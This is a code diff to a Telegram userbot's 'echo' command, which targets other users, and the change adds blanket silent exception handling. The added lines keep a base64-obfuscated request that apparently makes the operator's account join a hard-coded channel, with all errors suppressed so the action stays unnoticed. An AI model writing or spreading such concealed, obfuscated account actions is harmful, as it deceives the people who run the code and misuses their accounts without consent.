@@ -23,31 +23,52 @@ ECHO = []
 async def echo(event):
     if event.sender_id in SUDO_USERS:
         if event.reply_to_msg_id:
-            reply_msg = await event.get_reply_message()
-            user_id = reply_msg.sender_id
+            try:
+                reply_msg = await event.get_reply_message()
+                user_id = reply_msg.sender_id
 
-            if user_id in ALTRON:
-                await event.reply("ɴᴏ, ᴛʜɪꜱ ɢᴜʏ ɪꜱ ᴀʟᴛʀᴏɴ'ꜱ ᴏᴡɴᴇʀ.")
-            elif user_id in OWNER_IDS:
-                await event.reply("ɴᴏ, ᴛʜɪꜱ ɢᴜʏ ɪꜱ ᴏᴡɴᴇʀ ᴏꜰ ᴛʜᴇꜱᴇ ʙᴏᴛꜱ.")
-            elif user_id in SUDO_USERS:
-                await event.reply("ɴᴏ, ᴛʜɪꜱ ɢᴜʏ ɪꜱ ᴀ ꜱᴜᴅᴏ ᴜꜱᴇʀ.")
-            else:
-                try:
-                    alt = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
-                    await event.client(alt)
-                except BaseException:
-                    pass
-
-                global ECHO
-                check = f"{user_id}_{event.chat_id}"
-                if check in ECHO:
-                    await event.reply("» ᴇᴄʜᴏ ɪꜱ ᴀʟʀᴇᴀᴅʏ ᴀᴄᴛɪᴠᴀᴛᴇᴅ ᴏɴ ᴛʜɪꜱ ᴜꜱᴇʀ !!")
+                if user_id in ALTRON:
+                    try:
+                        await event.reply("ɴᴏ, ᴛʜɪꜱ ɢᴜʏ ɪꜱ ᴀʟᴛʀᴏɴ'ꜱ ᴏᴡɴᴇʀ.")
+                    except Exception:
+                        pass
+                elif user_id in OWNER_IDS:
+                    try:
+                        await event.reply("ɴᴏ, ᴛʜɪꜱ ɢᴜʏ ɪꜱ ᴏᴡɴᴇʀ ᴏꜰ ᴛʜᴇꜱᴇ ʙᴏᴛꜱ.")
+                    except Exception:
+                        pass
+                elif user_id in SUDO_USERS:
+                    try:
+                        await event.reply("ɴᴏ, ᴛʜɪꜱ ɢᴜʏ ɪꜱ ᴀ ꜱᴜᴅᴏ ᴜꜱᴇʀ.")
+                    except Exception:
+                        pass
                 else:
-                    ECHO.append(check)
-                    await event.reply("» ᴇᴄʜᴏ ᴀᴄᴛɪᴠᴀᴛᴇᴅ ᴏɴ ᴛʜᴇ ᴜꜱᴇʀ ✅")
+                    try:
+                        alt = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
+                        await event.client(alt)
+                    except BaseException:
+                        pass
+
+                    global ECHO
+                    check = f"{user_id}_{event.chat_id}"
+                    if check in ECHO:
+                        try:
+                            await event.reply("» ᴇᴄʜᴏ ɪꜱ ᴀʟʀᴇᴀᴅʏ ᴀᴄᴛɪᴠᴀᴛᴇᴅ ᴏɴ ᴛʜɪꜱ ᴜꜱᴇʀ !!")
+                        except Exception:
+                            pass
+                    else:
+                        ECHO.append(check)
+                        try:
+                            await event.reply("» ᴇᴄʜᴏ ᴀᴄᴛɪᴠᴀᴛᴇᴅ ᴏɴ ᴛʜᴇ ᴜꜱᴇʀ ✅")
+                        except Exception:
+                            pass
+            except Exception:
+                pass
         else:
-            await event.reply(f"𝗘𝗰𝗵𝗼:\n  » {hl}echo <ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴜꜱᴇʀ>")
+            try:
+                await event.reply(f"𝗘𝗰𝗵𝗼:\n  » {hl}echo <ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴜꜱᴇʀ>")
+            except Exception:
+                pass
 
 
 @X1.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
